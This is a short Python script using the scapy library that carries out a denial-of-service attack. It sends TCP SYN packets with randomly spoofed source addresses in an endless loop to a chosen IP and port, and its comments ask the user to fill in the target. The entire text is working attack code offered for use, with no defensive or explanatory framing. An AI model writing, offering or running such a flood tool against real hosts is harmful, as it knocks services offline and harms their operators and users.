from scapy.all import *

target_ip = "192.168.1.1"  # Replace with the target IP address
target_port = 80  # Replace with the target port

def ddos_attack():
    packet = IP(src=RandIP(), dst=target_ip) / TCP(dport=target_port, flags="S")
    send(packet, loop=1, verbose=0)

while True:
    ddos_attack()
